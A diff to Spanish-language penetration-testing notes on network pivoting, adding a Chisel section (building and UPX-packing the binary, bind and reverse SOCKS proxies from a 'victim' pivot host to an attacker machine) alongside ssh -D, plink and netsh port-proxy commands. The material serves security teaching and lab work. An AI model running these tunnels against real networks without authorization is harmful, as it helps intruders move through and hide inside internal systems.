@@ -70,7 +70,9 @@ Para crear un redireccionamiento que reciba conexiones en un puerto de la IP pú
 C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=[PUERTO_PÚBLICO_PIVOTE] listenaddress=[IP_PÚBLICA_PIVOTE] connectport=[PUERTO_SERVER_INTERNO] connectaddress=[IP_SERVER_INTERNO]
 ```
 
-# Acceso dinámico a subredes (PF Dinámico, SOCKS Proxying)
+---
+# Acceso dinámico a subredes:
+# PF Dinámico, SOCKS Proxying
 > [!tip] Nota: Objetivo
 > Convertir a la máquina víctima en un router/proxy. Permite interactuar con toda una subred interna sin tener que abrir múltiples túneles independientes manualmente.
 
@@ -102,6 +104,54 @@ ssh -D [PUERTO_LOCAL_PROXY] <user>@[IP_SERVIDOR]
 Desde ahí, todo el tráfico enviado a `127.0.0.1:[PUERTO_LOCAL_PROXY]` será enrutado y ejecutado desde la máquina pivote (`[IP_SERVIDOR]`).
 
 > En la mayoría de implementaciones de OpenSSH, la capacidad de tunelizar dinámicamente con `-D` está activada por defecto.
+
+### Chisel: Proxying / Tunneling
+Chisel es una herramienta escrita en Go que permite crear túneles entre dos dispositivos y transmitir datos cifrados usando SSH.
+
+#### Instalación
+Aunque podemos descargar binarios precompilados, para compilarlo haríamos lo siguiente:
+```bash
+# Máquina ATACANTE:
+git clone https://github.com/jpillora/chisel.git
+cd chisel
+
+# Compilar (strippeando tabla de símbolos e info de debugging para reducir tamaño)
+go build -ldflags="-s -w"
+# Opcional: Comprimir el archivo con UPX 
+# Determinados AV podrían detectarlo como malicioso aunque no lo sea, dado que ciertos
+# malware también suelen comprimirse y encodearse con UPX y los AV detectan sus firmas.
+upx --brute chisel
+```
+Una vez tengamos el binario, tendremos que pasarlo al servidor de algún modo.
+> [!Warning]+ Nota: Versiones de Glibc
+> En función de la versión de Glibc en el servidor, puede darse el caso de que al ejecutarlo aparezca un error como `version GLIBC_2.34 not found`. En tal caso una posible solución será descargar un binario precompilado de Chisel disponible en Github, p.ej, para x86_64, `chisel_[version]_linux_amd64.gz`.
+
+#### Bind Proxy
+En el servidor que usaremos como pivote, ejecutamos lo siguiente:
+```bash
+# Pivote
+chisel server -v -p [PUERTO] --socks5
+```
+Y en nuestra máquina atacante:
+```bash
+# Atacante
+chisel client -v [IP_PIVOTE]:[PUERTO] socks
+```
+Esto abrirá un puerto en localhost que podremos usar como proxy con, p.ej, `proxychains`.
+#### Reverse Proxy
+Aunque en el punto anterior hemos usado el servidor como servidor del proxy, la mayoría de veces habrá un firewall que bloquee nuestras conexiones. Para solucionar esto podemos usar chisel al revés, con nuestra máquina como servidor.
+
+```bash
+# Atacante
+sudo chisel server --reverse -v -p [PUERTO] --socks5
+```
+
+```bash
+# Pivote
+chisel client -v [IP_ATACANTE]:[PUERTO] R:socks
+```
+
+
 ## Windows
 ### Plink (PuTTY): Dynamic PF
 Plink (PuTTY Link) es una herramienta de CLI de Windows que permite conectarse por SSH a otros dispositivos. Hasta 2018, Windows no tenía un cliente ssh nativo, así que los administradores se tenían que descargar uno, y, en su momento, el de preferencia era PuTTY. Si el sistema tiene SSH, posiblemente tenga PuTTY, y por lo tanto Plink.
@@ -112,7 +162,8 @@ plink -ssh -D [PUERTO_LOCAL_PROXY] <user>@[IP_SERVIDOR]
 ```
 Esto creará un túnel desde `127.0.0.1:[PUERTO_LOCAL_PROXY]` hasta `[IP_SERVIDOR]`, que actuará como nuestro proxy.
 
-# Enrutamiento transparente (Auto-routing, VPN-like)
+---
+# Enrutamiento transparente (Auto-routing)
 > [!tip] Nota: Objetivo
 > Interactuar con la red interna directamente modificando las tablas de enrutamiento del sistema atacante, eliminando la necesidad de usar wrappers como proxychains.
 
